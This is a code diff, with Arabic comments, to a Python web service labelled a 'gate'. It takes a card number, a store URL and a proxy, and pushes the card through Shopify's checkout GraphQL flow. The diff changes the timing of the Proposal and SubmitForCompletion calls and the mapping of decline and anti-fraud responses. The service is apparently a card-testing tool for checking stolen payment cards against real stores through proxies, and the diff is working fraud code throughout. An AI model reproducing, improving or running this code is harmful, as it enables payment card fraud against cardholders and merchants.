@@ -21,7 +21,7 @@ def format_proxy(proxy_str):
     elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
     return f"http://{proxy_str}"
 
-def safe_response(msg, raw_data, price, gate="Python Dynamic V24 (Adaptive)"):
+def safe_response(msg, raw_data, price, gate="Python Dynamic V25 (Master)"):
     raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:400] if raw_data else "No Raw Data"
     final_msg = f"{msg} | RAW: {raw_clean}" if ("Failed" in msg or "Error" in msg or "Declined" in msg or "Rejected" in msg or "Empty" in msg or "Blocked" in msg) else msg
     clean_price = str(price).replace('$', '').strip() if price else "-"
@@ -86,7 +86,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             if add_res.status_code not in [200, 201]: 
                 return JSONResponse(content=safe_response("Cart Add Blocked", f"HTTP {add_res.status_code}", price))
 
-            time.sleep(1)
+            time.sleep(1.5)
 
             session.headers.pop("X-Requested-With", None)
             session.headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
@@ -188,17 +188,23 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "emailChanged": False, "phoneCountryCode": "US", "marketingConsent": [], "shopPayOptInPhone": None, "rememberMe": False}
             }
             
+            # 🔥 الضربة الأولى: تحفيز السيرفر للحساب
             res_prop = session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
             res_prop_json = res_prop.json()
             
             data_obj = res_prop_json.get('data')
             if not data_obj: return JSONResponse(content=safe_response("Proposal Rejected by Store", res_prop.text[:250], price))
                 
-            negotiate_res = data_obj.get('session', {}).get('negotiate', {}).get('result', {})
-            queue_token = negotiate_res.get('queueToken')
-            
+            queue_token = data_obj.get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
             if not queue_token: return JSONResponse(content=safe_response("Proposal Failed", res_prop.text[:250], price))
-            time.sleep(2)
+            
+            # 🔥 الانتظار الذكي حتى انتهاء السيرفر من حساب الضرائب والشحن (PENDING_TERMS)
+            time.sleep(4.5)
+            
+            # 🔥 الضربة الثانية: سحب الأرقام النهائية والمستقرة
+            res_prop2 = session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
+            res_prop_json2 = res_prop2.json()
+            negotiate_res = res_prop_json2.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
 
             seller_proposal = negotiate_res.get('sellerProposal', {})
             
@@ -307,40 +313,21 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 }
             }
             
-            # 🔥 محرك التكرار الذكي لزرار الدفع (Adaptive Polling)
-            max_retries = 4
-            sub_typename = None
-            sub_data = {}
-            res_sub_text = ""
+            res_sub = session.post(sub_url, json={"operationName": "SubmitForCompletion", "query": sub_query, "variables": sub_vars}, headers=gql_headers)
+            sub_data = res_sub.json().get('data', {}).get('submitForCompletion', {})
             
-            for attempt in range(max_retries):
-                res_sub = session.post(sub_url, json={"operationName": "SubmitForCompletion", "query": sub_query, "variables": sub_vars}, headers=gql_headers)
-                res_sub_text = res_sub.text
-                sub_data = res_sub.json().get('data', {}).get('submitForCompletion', {})
-                sub_typename = sub_data.get('__typename') if sub_data else None
-                
-                if sub_typename == 'SubmitRejected':
-                    errs = sub_data.get('errors', [])
-                    if errs:
-                        err_code = errs[0].get('code', '')
-                        # لو السيرفر لسه بيحسب، استنى 3.5 ثواني واضغط Submit تاني
-                        if err_code == 'WAITING_PENDING_TERMS':
-                            time.sleep(3.5)
-                            continue
-                # لو مفيش خطأ توقيت، اخرج من اللوب وكمل طبيعي
-                break
+            sub_typename = sub_data.get('__typename') if sub_data else None
 
-            # معالجة الرد النهائي بعد التكرار
             if sub_typename == 'SubmitRejected':
                 errs = sub_data.get('errors', [])
                 if errs:
                     err_code = errs[0].get('code', '')
                     if err_code == 'ARTIFACT_DISSATISFACTION':
-                        return JSONResponse(content=safe_response("Declined: Anti-Fraud Risk Block 🛡️", res_sub_text[:400], price))
+                        return JSONResponse(content=safe_response("Declined: Anti-Fraud Risk Block 🛡️", res_sub.text[:400], price))
                     msg = errs[0].get('localizedMessage', 'Rejected')
                 else:
                     msg = 'Rejected'
-                return JSONResponse(content=safe_response(f"Shopify System Rejected: {msg}", res_sub_text[:400], price))
+                return JSONResponse(content=safe_response(f"Shopify System Rejected: {msg}", res_sub.text[:400], price))
             
             if sub_typename == 'SubmitFailed':
                 return JSONResponse(content=safe_response("Declined: Silent Gateway Rejection 💳", "SubmitFailed (No Receipt)", price))
@@ -350,15 +337,15 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 if not receipt_id:
                     err = sub_data.get('receipt', {}).get('processingError', {}).get('code')
                     if err:
-                        return JSONResponse(content=safe_response(f"Declined: {err}", res_sub_text[:400], price))
+                        return JSONResponse(content=safe_response(f"Declined: {err}", res_sub.text[:400], price))
                     return JSONResponse(content=safe_response("Order processing 💎", "No Receipt ID", price))
             elif not sub_typename:
                 if not sub_data:
-                    return JSONResponse(content=safe_response("Empty Submit Response (Check status)", res_sub_text[:400], price))
+                    return JSONResponse(content=safe_response("Empty Submit Response (Check status)", res_sub.text[:400], price))
             
             receipt_id = sub_data.get('receipt', {}).get('id')
             if not receipt_id: 
-                return JSONResponse(content=safe_response("Submit Failed", res_sub_text[:400], price))
+                return JSONResponse(content=safe_response("Submit Failed", res_sub.text[:400], price))
 
             poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
             poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}}}"""
